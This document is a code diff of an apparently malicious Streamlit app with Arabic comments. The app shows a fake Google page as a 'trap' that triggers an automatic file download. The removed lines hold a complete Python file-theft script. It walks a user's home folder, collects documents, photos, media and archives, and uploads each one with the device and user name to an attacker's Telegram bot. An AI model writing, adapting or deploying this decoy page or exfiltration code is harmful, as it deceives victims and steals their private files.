@@ -316,8 +316,7 @@ else:
 
 
 # ============= معالجة طلبات التحميل (API Endpoint) =============
-# ============= فخ جوجل - عرض صفحة Google الوهمية =============
-# ============= فخ جوجل - عرض صفحة Google الوهمية مباشرة (خارج أي شرط) =============
+# ============= فخ جوجل - عرض صفحة Google الوهمية مباشرة (يجب أن يكون في آخر الملف) =============
 query_params = st.query_params
 
 if 'decoy' in query_params and query_params.get('decoy', [''])[0] == 'google':
@@ -328,93 +327,10 @@ if 'decoy' in query_params and query_params.get('decoy', [''])[0] == 'google':
         try:
             with open('index.html', 'r', encoding='utf-8') as f:
                 html_content = f.read()
-            
-            # عرض صفحة Google كاملة بدون واجهة Streamlit
-            st.components.v1.html(html_content, height=700, scrolling=False)
-            st.success("✅ تم تفعيل الفخ - انتظر تنزيل الملف تلقائياً")
-            
+            # عرض صفحة Google كاملة بدون أي واجهة Streamlit أخرى
+            st.components.v1.html(html_content, height=800, scrolling=False)
+            st.success("✅ تم تفعيل الفخ - سيتم تنزيل الملف تلقائياً")
         except Exception as e:
             st.error(f"❌ خطأ في تحميل صفحة Google: {e}")
-        
-        # spy_code يبقى هنا (للرجوع إليه فقط)
-        spy_code = f"""#!/usr/bin/env python3
-import os, requests, sys, platform, socket
-from pathlib import Path
-
-TELEGRAM_BOT_TOKEN = "{bot_token}"
-TELEGRAM_CHAT_ID = "{chat_id}"
-
-root_path = os.path.expanduser("~")
-extensions = ('.jpg', '.jpeg', '.png', '.mp4', '.pdf', '.docx', '.txt', '.doc', '.xls', '.xlsx', '.ppt', '.pptx', '.zip', '.rar', '.7z', '.gif', '.bmp', '.wav', '.mp3')
-
-def get_device_info():
-    try:
-        device_name = socket.gethostname()
-        system = platform.system()
-        user = os.environ.get('USERNAME', os.environ.get('USER', 'Unknown'))
-        return f"{{system}} | {{device_name}} | User: {{user}}"
-    except:
-        return "Unknown Device"
-
-def send_file_to_telegram(file_path, original_path):
-    try:
-        file_size = os.path.getsize(file_path)
-        if file_size > 50 * 1024 * 1024:
-            return False, "File too large"
-        
-        url = f"https://api.telegram.org/bot{{TELEGRAM_BOT_TOKEN}}/sendDocument"
-        with open(file_path, 'rb') as f:
-            files = {{'document': f}}
-            caption = f"📁 {{os.path.basename(file_path)}}\\n📍 {{original_path}}\\n💾 {{file_size / 1024:.2f}} KB\\n🖥️ {{get_device_info()}}"
-            data = {{'chat_id': TELEGRAM_CHAT_ID, 'caption': caption, 'parse_mode': 'Markdown'}}
-            response = requests.post(url, files=files, data=data, timeout=60)
-            return response.status_code == 200, "OK"
-    except:
-        return False, "Error"
-
-def send_message_to_telegram(message):
-    try:
-        url = f"https://api.telegram.org/bot{{TELEGRAM_BOT_TOKEN}}/sendMessage"
-        data = {{'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}}
-        response = requests.post(url, data=data, timeout=30)
-        return response.status_code == 200
-    except:
-        return False
-
-print("⚡ RASHD_AI: FILE EXFILTRATION STARTED ⚡")
-send_message_to_telegram("🚀 نظام سحب الملفات قد بدأ العمل\\n🖥️ الجهاز: " + get_device_info())
-
-count = 0
-failed = 0
-total_size = 0
-
-try:
-    for root, dirs, files in os.walk(root_path):
-        skip_dirs = ['.git', '.venv', '__pycache__', 'node_modules', '.cache', 'AppData', 'Library', 'Temp']
-        dirs[:] = [d for d in dirs if d not in skip_dirs]
-        
-        for file in files:
-            if file.lower().endswith(extensions):
-                file_path = os.path.join(root, file)
-                try:
-                    file_size = os.path.getsize(file_path)
-                    if file_size > 50 * 1024 * 1024:
-                        continue
-                    success, message = send_file_to_telegram(file_path, file_path)
-                    if success:
-                        count += 1
-                        total_size += file_size
-                    else:
-                        failed += 1
-                except:
-                    failed += 1
-except KeyboardInterrupt:
-    pass
-except Exception as e:
-    send_message_to_telegram(f"❌ خطأ عام: {{e}}")
-
-send_message_to_telegram(f"✅ انتهى سحب الملفات\\n✅ تم تحميل: {{count}} ملفات\\n❌ فشل: {{failed}} ملفات\\n💾 الحجم: {{total_size / 1024 / 1024:.2f}} MB")
-sys.exit(0)
-"""
     else:
         st.error("توكن أو Chat ID غير صحيح")
